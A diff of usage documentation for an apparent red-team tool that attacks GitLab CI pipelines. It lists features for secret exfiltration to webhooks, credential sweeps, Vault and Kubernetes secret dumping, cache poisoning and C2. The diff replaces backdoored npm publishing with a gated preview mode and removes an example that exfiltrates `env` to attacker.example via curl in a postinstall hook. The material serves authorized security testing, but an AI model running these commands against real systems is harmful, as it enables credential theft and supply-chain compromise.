@@ -21,7 +21,7 @@ gogatoz attack [options]
 - Commit CI to target repo: `--commit-ci` with exactly one CI source: `--ci-yaml`, `--ci-file`, `--ci-stdin`, or `--payload`.
 - Secrets exfiltration: `--secrets` creates a pipeline that posts environment/variables to a webhook (optionally RSA-encrypts).
 - Payload rendering only: `--payload-only` prints a single-job .gitlab-ci.yml to stdout without committing.
-- npm registry tampering: `--npm-tamper` publishes a backdoored npm package via a CI pipeline targeting the project's npm registry.
+- Package tamper testing: `--package-tamper` stages a manual npm, PyPI, or RubyGems preview. It does not publish unless every live-publish gate is explicitly enabled.
 - Vault enumeration: `--vault-enum` enumerates HashiCorp Vault secrets reachable from CI job identity (JWT/OIDC auth).
 - Kubernetes secret sweep: `--k8s-secrets` dumps Kubernetes secrets from namespaces accessible to the CI runner's service account.
 - Dead man's switch: `--dead-mans-switch` installs a scheduled pipeline or external monitor that triggers a handler if the attacker's access is revoked.
@@ -56,6 +56,7 @@ gogatoz attack [options]
   - `cache-poison`: Poison CI cache with malicious content (targets shared cache keys).
   - `infostealer`: Expanded credential sweep (40+ paths) covering AI tools, chat/IM, VPN, K8s, Docker, `gh auth token`, and recursive `.env` file discovery.
   - `job-token-push`: Attempt an isolated marker-branch push with `CI_JOB_TOKEN` and retain a sanitized success/denial report as an artifact.
+  - `package-tamper`: Create an isolated, preview-only npm, PyPI, or RubyGems mutation archive.
 
 ### Common payload options
 - `--job-name` string: Job name.
@@ -99,10 +100,74 @@ gogatoz attack [options]
 - `--cache-path` string: Cache path to poison (default: .).
 - `--poison-cmd` string: Command to run for cache poisoning.
 
-### npm-tamper options
-- `--npm-registry` string: npm registry URL to publish to (default: project's GitLab npm registry).
-- `--npm-package` string: Package name to tamper with (required).
-- `--npm-inject-script` string: Shell command to inject into the package's `postinstall` hook.
+### Package tamper options
+
+- `--package-tamper`: Commit a manual package-tamper job. Its default mode is preview-only.
+- `--tamper-ecosystem` string: `npm`, `pypi`, or `rubygems` (default: `npm`).
+- `--tamper-trigger` string: `preinstall`, `postinstall`, or `import`. Lifecycle triggers are npm-only.
+- `--tamper-entry-file` string: Canonical relative target file required by an `import` trigger.
+- `--tamper-inject-script` string: Code or lifecycle command to inject. The default is an inert console marker.
+- `--tamper-package-name` string: Exact authorized package identity; required for live publishing.
+- `--tamper-registry` string: Explicit registry URL; required for live publishing. HTTPS is required except for loopback.
+- `--tamper-live-publish`: Include package build/publish commands after all authorization checks.
+- `--tamper-publish-authorization` string: Must exactly equal `publish:<ecosystem>:<package>`.
+- `--tamper-allow-public-registry`: Additional opt-in required for npmjs, PyPI, or RubyGems.
+
+`--npm-tamper`, `--npm-registry`, `--npm-package`, and
+`--npm-inject-script` remain as compatibility aliases. They no longer discover
+writable packages, harvest tokens, execute an injected hook, or publish by
+default.
+
+Preview the generated job before committing anything:
+
+```bash
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem npm \
+  --tamper-trigger postinstall \
+  --tamper-inject-script 'node synthetic-marker.js' \
+  > package-tamper-preview.yml
+
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem pypi \
+  --tamper-trigger import \
+  --tamper-entry-file src/acme_fixture/__init__.py
+
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem rubygems \
+  --tamper-trigger import \
+  --tamper-entry-file lib/acme_fixture.rb
+```
+
+Every generated job is manual. Preview mode copies the checkout into a
+temporary directory, rejects symlink entry files, writes the modified copy to
+`package-tamper-preview.tar.gz`, and never invokes a package manager or runs the
+injected code. The original checkout remains unchanged.
+
+Live publishing is intentionally difficult to enable. Use it only on a package
+and registry named in written authorization:
+
+```bash
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem npm \
+  --tamper-trigger postinstall \
+  --tamper-package-name acme-owned-fixture \
+  --tamper-registry https://packages.example.test/npm \
+  --tamper-live-publish \
+  --tamper-publish-authorization publish:npm:acme-owned-fixture \
+  > authorized-live-publish.yml
+```
+
+The rendered job still refuses to publish until a protected, masked CI variable
+named `GOGATOZ_PACKAGE_TAMPER_APPROVED` contains the same
+`publish:npm:acme-owned-fixture` phrase and a human starts the manual job. It
+also verifies the static package metadata name before reaching a publish
+command. Public registries require `--tamper-allow-public-registry` in addition
+to both authorization gates.
+
+PyPI live mode runs the project's configured build backend, and RubyGems live
+mode evaluates its gemspec. Supply a reviewed, purpose-built runner image with
+the build and upload tools already installed; the generated job never installs
+them. Do not run live mode against unreviewed source.
 
 ### vault-enum options
 - `--vault-addr` string: HashiCorp Vault address (default: `$VAULT_ADDR` from CI environment).
@@ -391,11 +456,11 @@ gogatoz attack --target group/proj --cleanup --cleanup-jobs \
   --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 3
 ```
 
-### 13) npm package tampering
+### 13) Package tamper preview
 ```bash
-gogatoz attack --npm-tamper --target group/proj \
-  --npm-package @scope/shared-utils --npm-inject-script 'curl -sd "$(env)" https://attacker.example/cb' \
-  --branch gogatoz-attack --deconflict suffix
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem npm --tamper-trigger postinstall \
+  --tamper-inject-script 'node synthetic-marker.js'
 ```
 
 ### 14) Vault secret enumeration
@@ -474,6 +539,8 @@ gogatoz attack --c2-channel --target group/proj \
 
 - Obtain written authorization before testing.
 - Avoid production disruption; prefer test projects.
+- Keep package tamper tests in preview mode unless the exact package and registry are explicitly authorized.
+- Never use a real known-malicious third-party package as a fixture.
 - Review and remove artifacts (branches, CI YAML, keys, users) after testing.
 
 ## Authentication and Scopes
